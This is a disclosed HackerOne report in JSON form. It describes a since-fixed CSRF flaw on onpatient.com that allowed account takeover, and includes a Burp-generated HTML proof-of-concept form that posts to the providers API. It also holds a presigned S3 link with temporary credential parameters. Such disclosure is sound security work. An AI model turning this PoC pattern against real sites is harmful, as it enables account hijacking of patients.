{"id":141344,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEzNDQ=","url":"https://hackerone.com/reports/141344","title":"[CRITICAL]  CSRF  leading to account take over ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-27T04:08:39.712Z","submitted_at":"2016-05-27T04:08:39.712Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sysecure","url":"/sysecure","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/073/911/b184787c02640c30e3119be6893a8d616dee27c7_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1492,"url":"https://hackerone.com/drchrono","handle":"drchrono","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/492/22504e1f134263ff85b7870959fa127edcd98bd0_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/492/22504e1f134263ff85b7870959fa127edcd98bd0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"drchrono","twitter_handle":"drchrono","website":"https://www.drchrono.com","about":"EHR, Practice Management, Medical Billing \u0026 Revenue Cycle Management available on iPad, iPhone, web ... and a healthcare API."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-06-14T22:54:02.475Z","bug_reporter_agreed_on_going_public_at":"2016-06-13T21:39:34.631Z","team_member_agreed_on_going_public_at":"2016-06-14T22:54:02.348Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi , I have found a CSRF issue that allows an attacker to link his email account to the victim's account and hijack the whole account by adding himself in the providers list .\n\nThe link: https://onpatient.com/api/v3/providers\n\nContent-Type: application/json\nVary: Accept\nAllow: GET, POST, HEAD, OPTIONS\n\n[\nemails of providers\n]\n\n#Here is the poc \n\u003e\n\u003chtml\u003e\n\u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n\u003cbody\u003e\n\u003cdiv class=\"tab-pane active\" id=\"post-object-form\"\u003e\n                      \n                        \u003cform action=\"https://onpatient.com/api/v3/providers\" method=\"POST\" enctype=\"multipart/form-data\" class=\"form-horizontal\" novalidate=\"\"\u003e\n                          \u003cfieldset\u003e\n                            \n\u003cinput type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"oCSe26NkXpcEJ0X6MQzpZvFVfGY9M5yX\"\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group\"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Patient\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cselect class=\"form-control\" name=\"patient\"\u003e\n      \n      \n          \n            \u003coption value=\"213477\"\u003esaleh ss\u003c/option\u003e\n          \n      \n    \u003c/select\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Name\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cinput name=\"name\" class=\"form-control\" type=\"text\"\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Specialty\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cinput name=\"specialty\" class=\"form-control\" type=\"text\"\u003e \n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Fax\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cinput name=\"fax\" class=\"form-control\" type=\"text\"\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Email\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cinput name=\"email\" class=\"form-control\" type=\"email\"\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Phone\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003cinput name=\"phone\" class=\"form-control\" type=\"text\"\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n    \u003cdiv class=\"form-group \"\u003e\n  \n    \u003clabel class=\"col-sm-2 control-label \"\u003e\n      Address\n    \u003c/label\u003e\n  \n\n  \u003cdiv class=\"col-sm-10\"\u003e\n    \u003ctextarea name=\"address\" class=\"form-control\"\u003e\u003c/textarea\u003e\n\n    \n\n    \n  \u003c/div\u003e\n\u003c/div\u003e\n\n  \n\n  \n\n  \n\n\u003c!-- form.non_field_errors --\u003e\n\n                            \u003cdiv class=\"form-actions\"\u003e\n                              \u003cbutton class=\"btn btn-primary\" title=\"Make a POST request on the Provider List resource\"\u003ePOST\u003c/button\u003e\n                            \u003c/div\u003e\n                          \u003c/fieldset\u003e\n                        \u003c/form\u003e\n                      \n                    \u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-07-13T21:39:34.832Z","allow_singular_disclosure_after":-165513689.3702379,"singular_disclosure_allowed":true,"vote_count":7,"voters":["hack_the_planet","domxss","domx","moon","hackssy","dyabla","ebrynne"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":986445,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have attached the poc in html  file .\nPlease tell me if you are having any problems reproducing this.\nThanks!","automated_response":false,"created_at":"2016-05-27T04:11:14.242Z","updated_at":"2016-05-27T04:11:14.242Z","actor":{"username":"sysecure","cleared":false,"url":"/sysecure","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/073/911/b184787c02640c30e3119be6893a8d616dee27c7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":96338,"filename":"try.html","type":"text/html","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/338/9ccc9d44d9091b794da99cec0083c5e01974fde9/try.html?response-content-disposition=attachment%3B%20filename%3D%22try.html%22%3B%20filename%2A%3DUTF-8%27%27try.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134104Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e077b2f267fccfb3d02af869bbd53ee9d3a89152cad9288acf6be070f404905f"}],"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":986556,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-05-27T05:28:05.989Z","updated_at":"2016-05-27T05:28:05.989Z","actor":{"username":"kgarcia","cleared":false,"url":"/kgarcia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1003882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @kgarcia  , Any updates ?","automated_response":false,"created_at":"2016-06-07T23:06:25.891Z","updated_at":"2016-06-07T23:06:25.891Z","actor":{"username":"sysecure","cleared":false,"url":"/sysecure","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/073/911/b184787c02640c30e3119be6893a8d616dee27c7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1007475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great Work !\nIt has been fixed .\nI receive a response of :\na HTTP 403 Forbidden\nContent-Type: application/json\nVary: Accept\nAllow: GET, POST, HEAD, OPTIONS\n\n{\n    \"detail\": \"CSRF Failed: CSRF token missing or incorrect.\"\n}\n\n\nGreat Fix  .\nWaiting for your generous bounty .","automated_response":false,"created_at":"2016-06-10T01:55:46.021Z","updated_at":"2016-06-10T01:55:46.021Z","actor":{"username":"sysecure","cleared":false,"url":"/sysecure","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/073/911/b184787c02640c30e3119be6893a8d616dee27c7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1011551,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-06-13T18:37:37.779Z","updated_at":"2016-06-13T18:37:37.779Z","actor":{"url":"/drchrono","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/492/22504e1f134263ff85b7870959fa127edcd98bd0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"drchrono"}},"bounty_amount":"50.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"drchrono","collaborator":{"username":"sysecure","url":"/sysecure"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1011552,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-06-13T18:37:45.983Z","updated_at":"2016-06-13T18:37:45.983Z","actor":{"username":"kgarcia","cleared":false,"url":"/kgarcia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sysecure","url":"/sysecure"},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1011986,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for bounty can we  publicly disclose it ?","automated_response":false,"created_at":"2016-06-13T21:39:34.694Z","updated_at":"2016-06-13T21:39:34.694Z","first_to_agree":true,"actor":{"username":"sysecure","cleared":false,"url":"/sysecure","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/073/911/b184787c02640c30e3119be6893a8d616dee27c7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1014030,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-06-14T22:54:02.381Z","updated_at":"2016-06-14T22:54:02.381Z","actor":{"username":"kgarcia","cleared":false,"url":"/kgarcia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1014031,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-06-14T22:54:02.497Z","updated_at":"2016-06-14T22:54:02.497Z","actor":{"username":"kgarcia","cleared":false,"url":"/kgarcia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"drchrono","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}